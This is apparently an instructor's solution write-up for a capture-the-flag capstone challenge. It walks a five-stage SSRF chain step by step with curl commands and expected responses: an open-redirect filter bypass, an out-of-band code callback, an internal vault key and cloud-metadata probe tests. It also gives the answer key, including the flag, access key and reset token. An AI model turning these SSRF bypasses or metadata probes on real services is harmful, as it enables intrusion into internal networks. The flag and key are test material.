# Challenge 13 — The Admin Cover-Up (Final Capstone): Instructor Write-Up
**Target System:** Veyra Internal Mesh & Master Vault
**Category:** Multi-Stage Access Control / SSRF Chain
**Flag:** `ROOT{ssrf_ch41n_4dm1n_c0v3rup_99f1}`
**Points:** 20 (Final Tier — 200 Total Event Points)
**Port:** 3013

---

## 1. Architectural Concept & The 5-Stage Chain

Challenge 13 is the multi-stage capstone event module. It exercises progressive internal service pivoting, server-side request forgery (SSRF) bypass techniques, and out-of-band callback extraction via the Collaborator logging service (/collab).

```
[Attacker]
    │ 1. /preview?url=.../redirect?target=...
    ▼
[Stage 1: Public Preview & Open Redirect]
    │ 2. Internal SSRF fetch to 127.0.0.1:3013
    ▼
[Stage 2: /internal/proc-meta-39] ────► Discovers /internal/relay-auth-72
    │ 3. Dispatch callback request
    ▼
[Stage 3: /internal/relay-auth-72] ───► POSTs temporary SEC-code to Collab (Phase H)
    │                                          │
    │ 4. Read code from /collab/:token/log ◄───┘
    ▼
[Stage 4: Verify code at /internal/relay-auth-72/verify]
    │ Returns X-Veyra-Access-Key: veyra_adm_k3y_99f1a7 & /internal/core-vault-99
    ▼
[Stage 5: /internal/core-vault-99] ────► Returns Final Flag: ROOT{ssrf_ch41n_4dm1n_c0v3rup_99f1}
```

---

## 2. Stage-by-Stage Trigger Inputs & Expected Outputs

### Stage 1: Public Filter Reconnaissance & Open Redirect Bypass
The public service provides a URL preview utility at `/preview?url=...`.
Direct attempts to query localhost, private subnets (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), or cloud metadata (`169.254.169.254`) are blocked:
```bash
curl "http://localhost:3013/preview?url=http://127.0.0.1:3013/internal/proc-meta-39"
```
**Response (HTTP 403 Forbidden):**
```json
{
  "error": "ForbiddenAddress",
  "message": "Security filter violation: Requests to internal network or cloud metadata addresses are prohibited."
}
```

**The Intentional Bypass Gap:**
The service hosts an open redirect at `/redirect?target=...`.
Because the application's preview HTTP client follows 302 redirects automatically (`redirect: 'follow'`), submitting a URL targeting the public redirect endpoint bypasses the initial hostname filter:
```bash
curl "http://localhost:3013/preview?url=http://localhost:3013/redirect?target=http://127.0.0.1:3013/internal/proc-meta-39"
```

---

### Stage 2: First Internal Information Discovery (`/internal/proc-meta-39`)
Trigger input:
```bash
curl "http://localhost:3013/preview?url=http://localhost:3013/redirect?target=http://127.0.0.1:3013/internal/proc-meta-39"
```

**Expected Response (HTTP 200 OK):**
```json
{
  "status": "ok",
  "upstreamStatus": 200,
  "preview": {
    "service": "Veyra Internal Service Mesh Registry",
    "node_id": "mesh-node-49b2",
    "registered_services": [
      {
        "name": "Core Auth Relay",
        "path": "/internal/relay-auth-72",
        "methods": ["GET", "POST"],
        "description": "Issues temporary authorization access codes via collaborator callback webhook."
      }
    ]
  }
}
```
*Teaching Point:* Contains no secrets; deliberately reveals only the existence of the secondary service.

---

### Stage 3: Second Internal Page & OOB Callback (`/internal/relay-auth-72`)
To access the secondary service, the participant triggers a dispatch of a temporary security code to their team's Collaborator endpoint (`http://localhost:8082/c/<team_token>`):

Trigger input:
```bash
curl "http://localhost:3013/preview?url=http://localhost:3013/redirect?target=http://127.0.0.1:3013/internal/relay-auth-72/dispatch-code%3Fcallback_url=http://localhost:8082/c/clb_test_token"
```

**Expected Response (HTTP 200 OK):**
```json
{
  "status": "ok",
  "upstreamStatus": 200,
  "preview": {
    "status": "dispatched",
    "message": "Temporary security code dispatched to registered collaborator URL.",
    "expires_in": 300
  }
}
```

The participant checks their Collaborator log:
```bash
curl http://localhost:8082/collab/clb_test_token/log
```
**Collaborator Entry:**
```json
{
  "path": "/",
  "body": {
    "source": "Veyra-Auth-Relay-Internal",
    "event": "CODE_DISPATCH",
    "access_code": "SEC-B7A2",
    "expires_in_seconds": 300
  }
}
```

---

### Stage 4: Code Verification & Gateway Access Key
Submit the extracted code to `/internal/relay-auth-72/verify`:

Trigger input:
```bash
curl "http://localhost:3013/preview?url=http://localhost:3013/redirect?target=http://127.0.0.1:3013/internal/relay-auth-72/verify%3Fcode=SEC-B7A2"
```

**Expected Response (HTTP 200 OK):**
```json
{
  "status": "ok",
  "upstreamStatus": 200,
  "preview": {
    "status": "authorized",
    "message": "Access granted to internal administrative vault.",
    "vault_endpoint": "/internal/core-vault-99",
    "required_header": "X-Veyra-Access-Key",
    "access_key": "veyra_adm_k3y_99f1a7"
  }
}
```

---

### Stage 5: Final Internal Vault Extraction (`/internal/core-vault-99`)
Using the revealed access key and endpoint:

Trigger input:
```bash
curl "http://localhost:3013/preview?url=http://localhost:3013/redirect?target=http://127.0.0.1:3013/internal/core-vault-99%3Fkey=veyra_adm_k3y_99f1a7"
```
*(Or by passing the `X-Veyra-Access-Key: veyra_adm_k3y_99f1a7` request header).*

**Expected Response (HTTP 200 OK):**
```json
{
  "status": "ok",
  "upstreamStatus": 200,
  "preview": {
    "status": "success",
    "classification": "TOP SECRET // VEYRA CLOUD INFRASTRUCTURE",
    "message": "Master audit records released.",
    "flag": "ROOT{ssrf_ch41n_4dm1n_c0v3rup_99f1}",
    "incident": "ROOT CTF Final Stage Solved"
  }
}
```

**Final Competition Flag:** `ROOT{ssrf_ch41n_4dm1n_c0v3rup_99f1}`

---

## 3. Metadata Address Blocking Assertion
Testing that `http://169.254.169.254/latest/meta-data` is strictly unreachable:
1. Direct SSRF attempt:
   ```bash
   curl "http://localhost:3013/preview?url=http://169.254.169.254/latest/meta-data"
   ```
   **Result:** HTTP 403 Forbidden (`ForbiddenAddress`).
2. Redirect attempt:
   ```bash
   curl "http://localhost:3013/preview?url=http://localhost:3013/redirect?target=http://169.254.169.254"
   ```
   **Result:** Fails to connect / Connection refused (no link-local route permitted in container egress).

---

## 4. Reset Procedure

Trigger the standard two-part administrative reset:
```bash
curl -X POST http://localhost:3013/reset/13 \
  -H "Authorization: Bearer dev-reset-bearer-token-12345" \
  -H "Content-Type: application/json" \
  -d '{"team_token": "clb_test_token"}'
```

**Expected Response (HTTP 200 OK):**
```json
{
  "status": "ok",
  "challenge_id": 13,
  "reset_at": "2026-11-09T06:10:00.000Z",
  "message": "SSRF chain reset and collaborator entries cleared"
}
```
Or dispatch from the Platform Admin Console via the force-reset proxy.


## Integrated disposable runner

The integrated runner uses a fresh container for each request. Relay codes are expiring signed values rather than entries in a shared process map; copy the complete code received by the collaborator log into the same verification endpoint. The intended five-stage solve path is unchanged. Resetting module 13 rotates the signing secret and invalidates outstanding codes. Use the configured public target URL (local port 3113); the intentional internal self-fetch port remains 3013.
